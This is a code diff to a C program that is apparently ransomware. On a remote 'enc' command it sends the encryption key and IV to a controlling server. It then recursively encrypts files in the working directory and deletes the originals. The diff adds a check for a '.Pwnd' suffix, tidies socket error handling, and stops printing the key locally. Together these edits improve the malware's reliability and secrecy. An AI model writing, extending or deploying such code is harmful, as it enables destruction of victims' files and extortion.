@@ -7,7 +7,7 @@
 #include <stdio.h>
 #include <errno.h>
 
-void usage();
+void handleError(int sockid);
 
 int is_encrypted(char *filename);
 
@@ -27,7 +27,7 @@ int main (int argc, char * argv[])
     if (sockid <0)
     {
         printf("Error when creating socket\n");
-        abort();
+        handleError(sockid);
     }
 
     struct sockaddr_in server_addr;
@@ -43,14 +43,13 @@ int main (int argc, char * argv[])
     if (bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr))<0)
     {
         printf("Error during binding\n");
-        printf("%s", strerror(errno));
-        abort();
+        handleError(sockid);
+        
     }
     if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr))!=0)
     {
         printf("Error during connection\n");
-        printf("%s", strerror(errno));
-        abort();
+        handleError(sockid);
     }
 	
     while(1) 
@@ -61,7 +60,7 @@ int main (int argc, char * argv[])
         if (status<=0)
         {
             printf("Connection shutdown\n");
-            abort();
+            
         }
         
 
@@ -100,17 +99,6 @@ int main (int argc, char * argv[])
             send_key(pKey, pIv, sockid, server_addr);
 
             listdir((const char *)cwd, iv, key, 'e');
-            
-            
-            
-
-            printf("%s\n", key);
-            printf("%s\n", iv);
-            
-
-            
-            
-            
         }
         else if (strncmp(command, "dec",3)==0)
         {
@@ -229,12 +217,12 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             strncat(filePath,"/",2);
             strncat(filePath,dirp->d_name,strlen(dirp->d_name));
             printf("%s\n",filePath);
-            if (de_flag == 'e')
+            if (de_flag == 'e' && is_encrypted(filePath) == 0)
             {
                 encrypt(key, iv, filePath);
                 remove(filePath);
             }
-            else 
+            else if (de_flag == 'd' && is_encrypted(filePath) == 1)
             {
                 decrypt(key, iv, filePath);
                 remove(filePath);
@@ -243,7 +231,6 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
         }
     }
 }
-
 
 int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
 {
@@ -256,4 +243,25 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
     send(sockid, (const char *)msg, strlen(msg)+1,0);
     free(msg);
 }
-        
+
+int is_encrypted(char *filename)
+{
+    int size = strlen(filename);
+    if (filename[size-1] == 'd' && filename[size-2]=='n' && filename[size-3] == 'w' && filename[size-4] == 'P' && filename[size-5] == '.')
+    {
+        return 1;
+    }
+    else 
+    {
+        return 0;
+    }
+
+
+}        
+
+void handleError(int sockid)
+{
+    close(sockid);
+    abort();
+
+}
